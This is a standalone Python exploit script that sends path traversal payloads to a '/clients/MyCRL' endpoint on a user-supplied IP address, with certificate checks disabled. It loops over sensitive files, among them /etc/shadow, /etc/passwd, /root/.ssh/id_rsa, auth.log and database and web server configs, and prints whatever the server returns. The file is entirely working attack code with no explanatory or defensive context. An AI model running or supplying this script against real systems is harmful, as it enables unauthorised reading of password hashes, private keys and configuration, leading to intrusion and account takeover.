import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(ip, path):
    target = f'https://{ip}/clients/MyCRL'
    data = path

    headers = {
        'Host': f'{ip}',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Te': 'trailers',
        'Dnt': '1',
        'Connection': 'keep-alive',
        'Content-Length': str(len(data))
    }

    response = requests.post(target, headers=headers, data=data, verify=False)

    if response.status_code == 200:
        print(f"Contents of {path}:")
        print(response.text)
    else:
        print(f"Failed to access {path}")

if __name__ == '__main__':
    ip = input("Please enter the IP address: ")
    paths = [
        'aCSHELL/../../../../../../../../../../../etc/passwd',
        'aCSHELL/../../../../../../../../../../../etc/apache2/apache2.conf',
        'aCSHELL/../../../../../../../../../../../etc/mysql/my.cnf',
        'aCSHELL/../../../../../../../../../../../var/log/syslog',
        #'aCSHELL/../../../../../../../../../../../var/log/messages',
        'aCSHELL/../../../../../../../../../../../var/log/auth.log',
        'aCSHELL/../../../../../../../../../../../etc/group',
        'aCSHELL/../../../../../../../../../../../etc/shadow',
        'aCSHELL/../../../../../../../../../../../root/.ssh/id_rsa',
        'aCSHELL/../../../../../../../../../../../etc/hostname',
        'aCSHELL/../../../../../../../../../../../etc/hosts',
        'aCSHELL/../../../../../../../../../../../etc/resolv.conf'
    ]
    
    for path in paths:
        try:
            exploit(ip, path)
        except EOFError:
            exit(1)
        except KeyboardInterrupt:
            exit(1)
